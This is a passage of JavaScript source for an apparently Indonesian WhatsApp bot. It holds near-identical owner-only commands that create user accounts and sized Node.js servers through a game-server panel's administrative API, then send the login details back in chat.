					if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
					let f2 = await fetch(panel + "/api/application/nests/" + netsnya + "/eggs/" + egg, {
						"method": "GET",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser
						}
					})
					let data2 = await f2.json();
					let startup_cmd = data2.attributes.startup

					let f3 = await fetch(panel + "/api/application/servers", {
						"method": "POST",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser,
						},
						"body": JSON.stringify({
							"name": name,
							"description": " ",
							"user": user.id,
							"egg": parseInt(egg),
							"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
							"startup": startup_cmd,
							"environment": {
								"INST": "npm",
								"USER_UPLOAD": "0",
								"AUTO_UPDATE": "0",
								"CMD_RUN": "npm start"
							},
							"limits": {
								"memory": memo,
								"swap": 0,
								"disk": disk,
								"io": 500,
								"cpu": cpu
							},
							"feature_limits": {
								"databases": 5,
								"backups": 5,
								"allocations": 5
							},
							deploy: {
								locations: [parseInt(loc)],
								dedicated_ip: false,
								port_range: [],
							},
						})
					})
					let res = await f3.json()
					if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
					let server = res.attributes
					let ctf = await m.reply(`*SUCCES CREATE*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Tanggal : ${date}

*YOUR PANEL*

 • ID : ${user.id}
 • Username : ${user.username}
 • Email : ${user.email}
 • Name : ${user.first_name} ${user.last_name}
 • Bahasa : ${user.language}
 • Admin : ${user.root_admin}

Password telah dikirim di private chat @${u.split`@`[0]}`)

					let txt = `
email: ${email}
username: ${username}
password: ${password.toString()}
login: ${panel}

`
					let button = [{
							"name": "cta_copy",
							"buttonParamsJson": `{\"display_text\":\"Username\",\"id\":\"123456789\",\"copy_code\":\"${username}\"}`
						}, {
							"name": "cta_copy",
							"buttonParamsJson": `{\"display_text\":\"Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
						},
						{
							"name": "cta_url",
							"buttonParamsJson": `{\"display_text\":\"Login\",\"url\":\"${panel}\",\"merchant_url\":\"${panel}\"}`
						}
					]
					vreden.sendButtonText(u, button, `*THIS YOUR ACCOUNT*\n` + txt, footer, m)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case '12gb': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				let t = text.split(',');
				if (t.length < 2) return m.reply(`*Buat Dengan Cara!*
isi nama 👇🏾   nomor mu 👇🏾
${prefix + command} namamu,${nomore}`)
				let username = t[0];
				let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
				let name = username + " 12gb"
				let egg = eggsnya
				let loc = location
				let memo = "12200"
				let cpu = "220"
				let disk = "12200"
				let email = username + "@gmail.com"
				try {
					if (!u) return
					let d = (await vreden.onWhatsApp(u.split`@` [0]))[0] || {}
					let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
					let f = await fetch(panel + "/api/application/users", {
						"method": "POST",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser
						},
						"body": JSON.stringify({
							"email": email,
							"username": username,
							"first_name": username,
							"last_name": username,
							"language": "en",
							"password": password.toString()
						})
					})
					let data = await f.json();
					let user = data.attributes
					if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
					let f2 = await fetch(panel + "/api/application/nests/" + netsnya + "/eggs/" + egg, {
						"method": "GET",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser
						}
					})
					let data2 = await f2.json();
					let startup_cmd = data2.attributes.startup

					let f3 = await fetch(panel + "/api/application/servers", {
						"method": "POST",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser,
						},
						"body": JSON.stringify({
							"name": name,
							"description": " ",
							"user": user.id,
							"egg": parseInt(egg),
							"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
							"startup": startup_cmd,
							"environment": {
								"INST": "npm",
								"USER_UPLOAD": "0",
								"AUTO_UPDATE": "0",
								"CMD_RUN": "npm start"
							},
							"limits": {
								"memory": memo,
								"swap": 0,
								"disk": disk,
								"io": 500,
								"cpu": cpu
							},
							"feature_limits": {
								"databases": 5,
								"backups": 5,
								"allocations": 5
							},
							deploy: {
								locations: [parseInt(loc)],
								dedicated_ip: false,
								port_range: [],
							},
						})
					})
					let res = await f3.json()
					if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
					let server = res.attributes
					let ctf = await m.reply(`*SUCCES CREATE*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Tanggal : ${date}

*YOUR PANEL*

 • ID : ${user.id}
 • Username : ${user.username}
 • Email : ${user.email}
 • Name : ${user.first_name} ${user.last_name}
 • Bahasa : ${user.language}
 • Admin : ${user.root_admin}

Password telah dikirim di private chat @${u.split`@`[0]}`)

					let txt = `
email: ${email}
username: ${username}
password: ${password.toString()}
login: ${panel}

`
					let button = [{
							"name": "cta_copy",
							"buttonParamsJson": `{\"display_text\":\"Username\",\"id\":\"123456789\",\"copy_code\":\"${username}\"}`
						}, {
							"name": "cta_copy",
							"buttonParamsJson": `{\"display_text\":\"Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
						},
						{
							"name": "cta_url",
							"buttonParamsJson": `{\"display_text\":\"Login\",\"url\":\"${panel}\",\"merchant_url\":\"${panel}\"}`
						}
					]
					vreden.sendButtonText(u, button, `*THIS YOUR ACCOUNT*\n` + txt, footer, m)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case '13gb': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				let t = text.split(',');
				if (t.length < 2) return m.reply(`*Buat Dengan Cara!*
isi nama 👇🏾   nomor mu 👇🏾
${prefix + command} namamu,${nomore}`)
				let username = t[0];
				let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
				let name = username + " 13gb"
				let egg = eggsnya
				let loc = location
				let memo = "13200"
				let cpu = "230"
				let disk = "13200"
				let email = username + "@gmail.com"
				try {
					if (!u) return
					let d = (await vreden.onWhatsApp(u.split`@` [0]))[0] || {}
					let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
					let f = await fetch(panel + "/api/application/users", {
						"method": "POST",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser
						},
						"body": JSON.stringify({
							"email": email,
							"username": username,
							"first_name": username,
							"last_name": username,
							"language": "en",
							"password": password.toString()
						})
					})
					let data = await f.json();
					let user = data.attributes
					if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
					let f2 = await fetch(panel + "/api/application/nests/" + netsnya + "/eggs/" + egg, {
						"method": "GET",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser
						}
					})
					let data2 = await f2.json();
					let startup_cmd = data2.attributes.startup

					let f3 = await fetch(panel + "/api/application/servers", {
						"method": "POST",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser,
						},
						"body": JSON.stringify({
							"name": name,
							"description": " ",
							"user": user.id,
							"egg": parseInt(egg),
							"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
							"startup": startup_cmd,
							"environment": {
								"INST": "npm",
								"USER_UPLOAD": "0",
								"AUTO_UPDATE": "0",
								"CMD_RUN": "npm start"
							},
							"limits": {
								"memory": memo,
								"swap": 0,
								"disk": disk,
								"io": 500,
								"cpu": cpu
							},
							"feature_limits": {
								"databases": 5,
								"backups": 5,
								"allocations": 5
							},
							deploy: {
								locations: [parseInt(loc)],
								dedicated_ip: false,
								port_range: [],
							},
						})
					})
					let res = await f3.json()
					if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
					let server = res.attributes
					let ctf = await m.reply(`*SUCCES CREATE*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Tanggal : ${date}

*YOUR PANEL*

 • ID : ${user.id}
 • Username : ${user.username}
 • Email : ${user.email}
 • Name : ${user.first_name} ${user.last_name}
 • Bahasa : ${user.language}
 • Admin : ${user.root_admin}

Password telah dikirim di private chat @${u.split`@`[0]}`)

					let txt = `
email: ${email}
username: ${username}
password: ${password.toString()}
login: ${panel}

`
					let button = [{
							"name": "cta_copy",
							"buttonParamsJson": `{\"display_text\":\"Username\",\"id\":\"123456789\",\"copy_code\":\"${username}\"}`
						}, {
							"name": "cta_copy",
							"buttonParamsJson": `{\"display_text\":\"Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
						},
						{
							"name": "cta_url",
							"buttonParamsJson": `{\"display_text\":\"Login\",\"url\":\"${panel}\",\"merchant_url\":\"${panel}\"}`
						}
					]
					vreden.sendButtonText(u, button, `*THIS YOUR ACCOUNT*\n` + txt, footer, m)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case '14gb': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				let t = text.split(',');
				if (t.length < 2) return m.reply(`*Buat Dengan Cara!*
isi nama 👇🏾   nomor mu 👇🏾
${prefix + command} namamu,${nomore}`)
				let username = t[0];
				let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
				let name = username + " 14gb"
				let egg = eggsnya
				let loc = location
				let memo = "14200"
				let cpu = "240"
				let disk = "14200"
				let email = username + "@gmail.com"
				try {
					if (!u) return
					let d = (await vreden.onWhatsApp(u.split`@` [0]))[0] || {}
					let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
					let f = await fetch(panel + "/api/application/users", {
						"method": "POST",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser
						},
						"body": JSON.stringify({
							"email": email,
							"username": username,
							"first_name": username,
							"last_name": username,
							"language": "en",
							"password": password.toString()
						})
					})
					let data = await f.json();
					let user = data.attributes
					if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
					let f2 = await fetch(panel + "/api/application/nests/" + netsnya + "/eggs/" + egg, {
						"method": "GET",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser
						}
					})
					let data2 = await f2.json();
					let startup_cmd = data2.attributes.startup

					let f3 = await fetch(panel + "/api/application/servers", {
						"method": "POST",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser,
						},
						"body": JSON.stringify({
							"name": name,
							"description": " ",
							"user": user.id,
							"egg": parseInt(egg),
							"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
							"startup": startup_cmd,
							"environment": {
								"INST": "npm",
								"USER_UPLOAD": "0",
								"AUTO_UPDATE": "0",
								"CMD_RUN": "npm start"
							},
							"limits": {
								"memory": memo,
								"swap": 0,
								"disk": disk,
								"io": 500,
								"cpu": cpu
							},
							"feature_limits": {
								"databases": 5,
								"backups": 5,
								"allocations": 5
							},
							deploy: {
								locations: [parseInt(loc)],
								dedicated_ip: false,
								port_range: [],
							},
						})
					})
					let res = await f3.json()
					if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
					let server = res.attributes
					let ctf = await m.reply(`*SUCCES CREATE*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Tanggal : ${date}

*YOUR PANEL*

 • ID : ${user.id}
 • Username : ${user.username}
 • Email : ${user.email}
 • Name : ${user.first_name} ${user.last_name}
 • Bahasa : ${user.language}
 • Admin : ${user.root_admin}

Password telah dikirim di private chat @${u.split`@`[0]}`)

					let txt = `
email: ${email}
username: ${username}
password: ${password.toString()}
login: ${panel}

`
					let button = [{
							"name": "cta_copy",
							"buttonParamsJson": `{\"display_text\":\"Username\",\"id\":\"123456789\",\"copy_code\":\"${username}\"}`
						}, {
							"name": "cta_copy",
							"buttonParamsJson": `{\"display_text\":\"Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
						},
						{
							"name": "cta_url",
							"buttonParamsJson": `{\"display_text\":\"Login\",\"url\":\"${panel}\",\"merchant_url\":\"${panel}\"}`
						}
					]
					vreden.sendButtonText(u, button, `*THIS YOUR ACCOUNT*\n` + txt, footer, m)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case '15gb': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				let t = text.split(',');
				if (t.length < 2) return m.reply(`*Buat Dengan Cara!*
isi nama 👇🏾   nomor mu 👇🏾
${prefix + command} namamu,${nomore}`)
				let username = t[0];
				let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
				let name = username + " 15gb"
				let egg = eggsnya
				let loc = location
				let memo = "15200"
				let cpu = "250"
				let disk = "15200"
				let email = username + "@gmail.com"
				try {
					if (!u) return
					let d = (await vreden.onWhatsApp(u.split`@` [0]))[0] || {}
					let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
					let f = await fetch(panel + "/api/application/users", {
						"method": "POST",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser
						},
						"body": JSON.stringify({
							"email": email,
							"username": username,
							"first_name": username,
							"last_name": username,
							"language": "en",
							"password": password.toString()
						})
					})
					let data = await f.json();
					let user = data.attributes
					if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
					let f2 = await fetch(panel + "/api/application/nests/" + netsnya + "/eggs/" + egg, {
						"method": "GET",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser
						}
					})
					let data2 = await f2.json();
					let startup_cmd = data2.attributes.startup

					let f3 = await fetch(panel + "/api/application/servers", {
						"method": "POST",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser,
						},
						"body": JSON.stringify({
							"name": name,
							"description": " ",
							"user": user.id,
							"egg": parseInt(egg),
							"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
							"startup": startup_cmd,
							"environment": {
								"INST": "npm",
								"USER_UPLOAD": "0",
								"AUTO_UPDATE": "0",
								"CMD_RUN": "npm start"
							},
							"limits": {
								"memory": memo,
								"swap": 0,
								"disk": disk,
								"io": 500,
								"cpu": cpu
							},
							"feature_limits": {
								"databases": 5,
								"backups": 5,
								"allocations": 5
							},
							deploy: {
								locations: [parseInt(loc)],
								dedicated_ip: false,
								port_range: [],
							},
						})
					})
					let res = await f3.json()
					if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
					let server = res.attributes
					let ctf = await m.reply(`*SUCCES CREATE*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Tanggal : ${date}

*YOUR PANEL*

 • ID : ${user.id}
 • Username : ${user.username}
 • Email : ${user.email}
 • Name : ${user.first_name} ${user.last_name}
 • Bahasa : ${user.language}
 • Admin : ${user.root_admin}

Password telah dikirim di private chat @${u.split`@`[0]}`)

					let txt = `
email: ${email}
username: ${username}
password: ${password.toString()}
login: ${panel}

`
					let button = [{
							"name": "cta_copy",
							"buttonParamsJson": `{\"display_text\":\"Username\",\"id\":\"123456789\",\"copy_code\":\"${username}\"}`
						}, {
							"name": "cta_copy",
							"buttonParamsJson": `{\"display_text\":\"Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
						},
						{
							"name": "cta_url",
							"buttonParamsJson": `{\"display_text\":\"Login\",\"url\":\"${panel}\",\"merchant_url\":\"${panel}\"}`
						}
					]
					vreden.sendButtonText(u, button, `*THIS YOUR ACCOUNT*\n` + txt, footer, m)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case '16gb': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				let t = text.split(',');
				if (t.length < 2) return m.reply(`*Buat Dengan Cara!*
isi nama 👇🏾   nomor mu 👇🏾
${prefix + command} namamu,${nomore}`)
				let username = t[0];
				let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
				let name = username + " 16gb"
				let egg = eggsnya
				let loc = location
				let memo = "16200"
				let cpu = "260"
				let disk = "16200"
				let email = username + "@gmail.com"
				try {
					if (!u) return
					let d = (await vreden.onWhatsApp(u.split`@` [0]))[0] || {}
					let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
					let f = await fetch(panel + "/api/application/users", {
						"method": "POST",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser
						},
						"body": JSON.stringify({
							"email": email,
							"username": username,
							"first_name": username,
							"last_name": username,
							"language": "en",
							"password": password.toString()
						})
					})
					let data = await f.json();
					let user = data.attributes
					if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
					let f2 = await fetch(panel + "/api/application/nests/" + netsnya + "/eggs/" + egg, {
						"method": "GET",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser
						}
					})
					let data2 = await f2.json();
					let startup_cmd = data2.attributes.startup

					let f3 = await fetch(panel + "/api/application/servers", {
						"method": "POST",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser,
						},
						"body": JSON.stringify({
							"name": name,
							"description": " ",
							"user": user.id,
							"egg": parseInt(egg),
							"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
							"startup": startup_cmd,
							"environment": {
								"INST": "npm",
								"USER_UPLOAD": "0",
								"AUTO_UPDATE": "0",
								"CMD_RUN": "npm start"
							},
							"limits": {
								"memory": memo,
								"swap": 0,
								"disk": disk,
								"io": 500,
								"cpu": cpu
							},
							"feature_limits": {
								"databases": 5,
								"backups": 5,
								"allocations": 5
							},
							deploy: {
								locations: [parseInt(loc)],
								dedicated_ip: false,
								port_range: [],
							},
						})
					})
					let res = await f3.json()
					if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
					let server = res.attributes
					let ctf = await m.reply(`*SUCCES CREATE*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Tanggal : ${date}

*YOUR PANEL*

 • ID : ${user.id}
 • Username : ${user.username}
 • Email : ${user.email}
 • Name : ${user.first_name} ${user.last_name}
 • Bahasa : ${user.language}
 • Admin : ${user.root_admin}

Password telah dikirim di private chat @${u.split`@`[0]}`)

					let txt = `
email: ${email}
username: ${username}
password: ${password.toString()}
login: ${panel}

`
					let button = [{
							"name": "cta_copy",
							"buttonParamsJson": `{\"display_text\":\"Username\",\"id\":\"123456789\",\"copy_code\":\"${username}\"}`
						}, {
							"name": "cta_copy",
							"buttonParamsJson": `{\"display_text\":\"Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
						},
						{
							"name": "cta_url",
							"buttonParamsJson": `{\"display_text\":\"Login\",\"url\":\"${panel}\",\"merchant_url\":\"${panel}\"}`
						}
					]
					vreden.sendButtonText(u, button, `*THIS YOUR ACCOUNT*\n` + txt, footer, m)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case '17gb': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				let t = text.split(',');
				if (t.length < 2) return m.reply(`*Buat Dengan Cara!*
isi nama 👇🏾   nomor mu 👇🏾
${prefix + command} namamu,${nomore}`)
				let username = t[0];
				let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
				let name = username + " 17gb"
				let egg = eggsnya
				let loc = location
				let memo = "17200"
				let cpu = "270"
				let disk = "17200"
				let email = username + "@gmail.com"
				try {
					if (!u) return
					let d = (await vreden.onWhatsApp(u.split`@` [0]))[0] || {}
					let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
					let f = await fetch(panel + "/api/application/users", {
						"method": "POST",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser
						},
						"body": JSON.stringify({
							"email": email,
							"username": username,
							"first_name": username,
							"last_name": username,
							"language": "en",
							"password": password.toString()
						})
					})
					let data = await f.json();
					let user = data.attributes
					if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
					let f2 = await fetch(panel + "/api/application/nests/" + netsnya + "/eggs/" + egg, {
						"method": "GET",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser
						}
					})
					let data2 = await f2.json();
					let startup_cmd = data2.attributes.startup

					let f3 = await fetch(panel + "/api/application/servers", {
						"method": "POST",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser,
						},
						"body": JSON.stringify({
							"name": name,
							"description": " ",
							"user": user.id,
							"egg": parseInt(egg),
							"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
							"startup": startup_cmd,
							"environment": {
								"INST": "npm",
								"USER_UPLOAD": "0",
								"AUTO_UPDATE": "0",
								"CMD_RUN": "npm start"
							},
							"limits": {
								"memory": memo,
								"swap": 0,
								"disk": disk,
								"io": 500,
								"cpu": cpu
							},
							"feature_limits": {
								"databases": 5,
								"backups": 5,
								"allocations": 5
							},
							deploy: {
								locations: [parseInt(loc)],
								dedicated_ip: false,
								port_range: [],
							},
						})
					})
					let res = await f3.json()
					if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
					let server = res.attributes
					let ctf = await m.reply(`*SUCCES CREATE*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Tanggal : ${date}

*YOUR PANEL*

 • ID : ${user.id}
 • Username : ${user.username}
 • Email : ${user.email}
 • Name : ${user.first_name} ${user.last_name}
 • Bahasa : ${user.language}
 • Admin : ${user.root_admin}

Password telah dikirim di private chat @${u.split`@`[0]}`)

					let txt = `
email: ${email}
username: ${username}
password: ${password.toString()}
login: ${panel}

`
					let button = [{
							"name": "cta_copy",
							"buttonParamsJson": `{\"display_text\":\"Username\",\"id\":\"123456789\",\"copy_code\":\"${username}\"}`
						}, {
							"name": "cta_copy",
							"buttonParamsJson": `{\"display_text\":\"Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
						},
						{
							"name": "cta_url",
							"buttonParamsJson": `{\"display_text\":\"Login\",\"url\":\"${panel}\",\"merchant_url\":\"${panel}\"}`
						}
					]
					vreden.sendButtonText(u, button, `*THIS YOUR ACCOUNT*\n` + txt, footer, m)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case '18gb': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				let t = text.split(',');
				if (t.length < 2) return m.reply(`*Buat Dengan Cara!*
isi nama 👇🏾   nomor mu 👇🏾
${prefix + command} namamu,${nomore}`)
				let username = t[0];
				let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
				let name = username + " 18gb"
				let egg = eggsnya
				let loc = location
				let memo = "18200"
				let cpu = "280"
				let disk = "18200"
				let email = username + "@gmail.com"
				try {
					if (!u) return
					let d = (await vreden.onWhatsApp(u.split`@` [0]))[0] || {}
					let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
					let f = await fetch(panel + "/api/application/users", {
						"method": "POST",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser
						},
						"body": JSON.stringify({
							"email": email,
							"username": username,
							"first_name": username,
							"last_name": username,
							"language": "en",
							"password": password.toString()
						})
					})
					let data = await f.json();
					let user = data.attributes
					if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
					let f2 = await fetch(panel + "/api/application/nests/" + netsnya + "/eggs/" + egg, {
						"method": "GET",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser
						}
					})
					let data2 = await f2.json();
					let startup_cmd = data2.attributes.startup

					let f3 = await fetch(panel + "/api/application/servers", {
						"method": "POST",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser,
						},
						"body": JSON.stringify({
							"name": name,
							"description": " ",
							"user": user.id,
							"egg": parseInt(egg),
							"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
							"startup": startup_cmd,
							"environment": {
								"INST": "npm",
								"USER_UPLOAD": "0",
								"AUTO_UPDATE": "0",
								"CMD_RUN": "npm start"
							},
							"limits": {
								"memory": memo,
								"swap": 0,
								"disk": disk,
								"io": 500,
								"cpu": cpu
							},
							"feature_limits": {
								"databases": 5,
								"backups": 5,
								"allocations": 5
							},
							deploy: {
								locations: [parseInt(loc)],
								dedicated_ip: false,
								port_range: [],
							},
						})
					})
					let res = await f3.json()
					if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
					let server = res.attributes
					let ctf = await m.reply(`*SUCCES CREATE*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Tanggal : ${date}

*YOUR PANEL*

 • ID : ${user.id}
 • Username : ${user.username}
 • Email : ${user.email}
 • Name : ${user.first_name} ${user.last_name}
 • Bahasa : ${user.language}
 • Admin : ${user.root_admin}

Password telah dikirim di private chat @${u.split`@`[0]}`)

					let txt = `
email: ${email}
username: ${username}
password: ${password.toString()}
login: ${panel}

`
					let button = [{
							"name": "cta_copy",
							"buttonParamsJson": `{\"display_text\":\"Username\",\"id\":\"123456789\",\"copy_code\":\"${username}\"}`
						}, {
							"name": "cta_copy",
							"buttonParamsJson": `{\"display_text\":\"Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
						},
						{
							"name": "cta_url",
							"buttonParamsJson": `{\"display_text\":\"Login\",\"url\":\"${panel}\",\"merchant_url\":\"${panel}\"}`
						}
					]
					vreden.sendButtonText(u, button, `*THIS YOUR ACCOUNT*\n` + txt, footer, m)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case '19gb': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				let t = text.split(',');
				if (t.length < 2) return m.reply(`*Buat Dengan Cara!*
isi nama 👇🏾   nomor mu 👇🏾
${prefix + command} namamu,${nomore}`)
				let username = t[0];
				let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
				let name = username + " 19gb"
				let egg = eggsnya
				let loc = location
				let memo = "19200"
				let cpu = "290"
				let disk = "19200"
				let email = username + "@gmail.com"
				try {
					if (!u) return
					let d = (await vreden.onWhatsApp(u.split`@` [0]))[0] || {}
					let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
					let f = await fetch(panel + "/api/application/users", {
						"method": "POST",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser
						},
						"body": JSON.stringify({
							"email": email,
							"username": username,
							"first_name": username,
							"last_name": username,
							"language": "en",
							"password": password.toString()
						})
					})
					let data = await f.json();
					let user = data.attributes
					if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
					let f2 = await fetch(panel + "/api/application/nests/" + netsnya + "/eggs/" + egg, {
						"method": "GET",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser
						}
					})
					let data2 = await f2.json();
					let startup_cmd = data2.attributes.startup

					let f3 = await fetch(panel + "/api/application/servers", {
						"method": "POST",
						"headers": {
							"Accept": "application/json",
							"Content-Type": "application/json",
							"Authorization": "Bearer " + apiuser,
						},
						"body": JSON.stringify({
							"name": name,
							"description": " ",
							"user": user.id,
							"egg": parseInt(egg),
							"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
							"startup": startup_cmd,
							"environment": {
								"INST": "npm",
								"USER_UPLOAD": "0",
								"AUTO_UPDATE": "0",
								"CMD_RUN": "npm start"
							},
							"limits": {
								"memory": memo,
								"swap": 0,
								"disk": disk,
								"io": 500,
								"cpu": cpu
							},
							"feature_limits": {
								"databases": 5,
								"backups": 5,
								"allocations": 5
							},
							deploy: {
								locations: [parseInt(loc)],
								dedicated_ip: false,
								port_range: [],
							},
						})
					})
					let res = await f3.json()
					if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
					let server = res.attributes
					let ctf = await m.reply(`*SUCCES CREATE*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Tanggal : ${date}

*YOUR PANEL*

 • ID : ${user.id}
 • Username : ${user.username}
 • Email : ${user.email}
 • Name : ${user.first_name} ${user.last_name}
 • Bahasa : ${user.language}
 • Admin : ${user.root_admin}

Password telah dikirim di private chat @${u.split`@`[0]}`)

					let txt = `
email: ${email}
username: ${username}
password: ${password.toString()}
login: ${panel}

`
					let button = [{
							"name": "cta_copy",
							"buttonParamsJson": `{\"display_text\":\"Username\",\"id\":\"123456789\",\"copy_code\":\"${username}\"}`
						}, {
							"name": "cta_copy",
							"buttonParamsJson": `{\"display_text\":\"Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
						},
						{
							"name": "cta_url",
							"buttonParamsJson": `{\"display_text\":\"Login\",\"url\":\"${panel}\",\"merchant_url\":\"${panel}\"}`
						}
					]
					vreden.sendButtonText(u, button, `*THIS YOUR ACCOUNT*\n` + txt, footer, m)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
